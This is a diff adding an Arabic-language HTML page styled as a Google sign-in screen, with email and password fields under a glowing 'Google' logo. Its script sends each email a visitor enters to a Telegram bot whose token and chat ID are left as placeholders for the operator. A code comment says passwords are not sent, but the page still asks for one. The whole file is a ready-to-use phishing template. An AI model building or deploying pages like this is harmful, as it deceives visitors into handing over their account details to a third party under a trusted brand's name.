@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>My Custom Page</title>
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        height: 100vh;
+        background: linear-gradient(135deg, #1e3c72, #8e44ad);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: flex-start;
+        font-family: Arial, sans-serif;
+    }
+
+    /* دائرة الصورة */
+    .circle-img {
+        width: 180px;
+        height: 180px;
+        border-radius: 50%;
+        overflow: hidden;
+        margin-top: 40px;
+        border: 4px solid rgba(255,255,255,0.7);
+        box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+    .circle-img img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+
+    /* نص Google المتوهّج */
+    #glowText {
+        margin-top: 25px;
+        font-size: 80px;
+        font-weight: bold;
+        color: white;
+        text-shadow: 0 0 20px red;
+        transition: 0.5s;
+    }
+
+    /* صندوق تسجيل الدخول */
+    .box {
+        width: 320px;
+        padding: 20px;
+        background: #333;
+        border-radius: 12px;
+        margin-top: 30px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+
+    .box h2 {
+        text-align: center;
+        margin-bottom: 20px;
+        color: white;
+    }
+
+    .input-field {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 12px;
+        background: #6a00ff;
+        border: none;
+        color: white;
+        border-radius: 8px;
+        font-size: 18px;
+        cursor: pointer;
+    }
+
+    .btn:hover {
+        background: #8e2bff;
+    }
+</style>
+
+</head>
+<body>
+
+    <!-- الصورة الدائرية -->
+    <div class="circle-img">
+        <img src="ggg.png" alt="Image">
+    </div>
+
+    <!-- نص Google -->
+    <div id="glowText">Google</div>
+
+    <!-- صندوق login -->
+    <div class="box">
+        <h2>تسجيل الدخول</h2>
+
+        <input type="email" id="emailInput" class="input-field" placeholder="أدخل بريدك الإلكتروني">
+        <input type="password" id="passwordInput" class="input-field" placeholder="كلمة السر">
+
+        <button class="btn" onclick="sendToTelegram()">إرسال رسالة آمنة</button>
+    </div>
+
+
+<script>
+/* توهّج كلمة Google */
+const text = document.getElementById("glowText");
+let colors = ["red", "#ff0066", "#cc00cc", "#9900ff", "#6600ff", "#cc00cc"];
+let i = 0;
+
+setInterval(() => {
+    text.style.textShadow = `0 0 30px ${colors[i]}`;
+    i = (i + 1) % colors.length;
+}, 500);
+
+
+/* إرسال رسالة عادية إلى تليغرام — بدون كلمات سر */
+const BOT_TOKEN = "PUT_YOUR_TOKEN_HERE";   // ← ضع توكن البوت هنا
+const CHAT_ID  = "PUT_CHAT_ID_HERE";      // ← ضع ID هنا
+
+function sendToTelegram() {
+    const email = document.getElementById("emailInput").value;
+
+    if (!email) return alert("أدخل بريدك أولاً");
+
+    const text = `📩 رسالة جديدة من الموقع:\n\nEmail: ${email}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    })
+    .then(() => alert("تم إرسال الرسالة ✔"))
+    .catch(() => alert("تعذّر الإرسال ❌"));
+}
+</script>
+
+</body>
+  </html>
